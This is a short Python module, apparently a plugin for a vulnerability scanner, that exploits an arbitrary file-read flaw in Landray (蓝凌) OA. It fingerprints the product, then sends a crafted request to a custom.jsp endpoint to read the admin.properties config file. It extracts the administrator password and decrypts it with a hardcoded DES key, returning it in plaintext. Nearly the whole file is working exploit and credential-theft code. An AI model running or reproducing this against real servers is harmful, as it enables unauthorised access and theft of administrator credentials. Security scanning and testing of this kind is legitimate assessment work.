# -*- coding:utf-8 -*-
# 蓝凌OA 任意文件读取
import base64
import re

from Crypto.Cipher import DES

from .. import requestUtil, fileUtil
from ServiceScanModel.models import ServiceScan


def read_file(url, filename="/WEB-INF/KmssConfig/admin.properties"):
    resp = requestUtil.post(url + "/sys/ui/extend/varkind/custom.jsp", data='var={"body":{"file":"%s"}}' % filename)
    return resp.text


def descrypt(password):
    key = "kmssAdminKey"[:8].encode()
    des = DES.new(key=key, mode=DES.MODE_ECB)
    text = des.decrypt(base64.b64decode(password))
    return text[:-text[-1]].decode()


def fingerprint(service):
    try:
        if service.url:
            resp = requestUtil.get(service.url)
            if "蓝凌软件" in resp.text:
                return True
    except:
        return False


def poc(service: ServiceScan):
    try:
        result = read_file(service.url)
        password = re.findall(r'password = (.*?)\r', result)[0]
        password = descrypt(password)
        return ["蓝凌OA 任意文件读取", "管理员密码: %s" % password]
    except:
        return []
